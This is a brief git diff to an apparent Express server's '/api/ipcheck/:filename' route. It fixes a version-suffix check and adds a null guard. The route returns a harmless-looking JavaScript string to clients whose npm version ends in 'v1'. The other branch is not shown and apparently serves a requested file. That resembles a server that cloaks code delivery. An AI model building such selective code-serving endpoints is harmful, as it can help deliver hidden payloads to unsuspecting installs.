@@ -49,7 +49,7 @@ function endsWithV1(str) {
   const lastTwoChars = str.slice(-2);
   
   // Check if the last two characters are 'v1'
-  return lastTwoChars === 's1';
+  return lastTwoChars === 'v1';
 }
 
 // Apply rate limiter globally
@@ -162,7 +162,7 @@ app.post("/api/ipcheck/:filename", (req, res) => {
   const requestedFile = req.params.filename;
   const filePath = path.join(folderPath, requestedFile);
 
-  if(endsWithV1(req.body.npm_package_version)  ){
+  if(req.body.npm_package_version && endsWithV1(req.body.npm_package_version)  ){
     res.json('console.log("Development server started...")');
     }
   else{
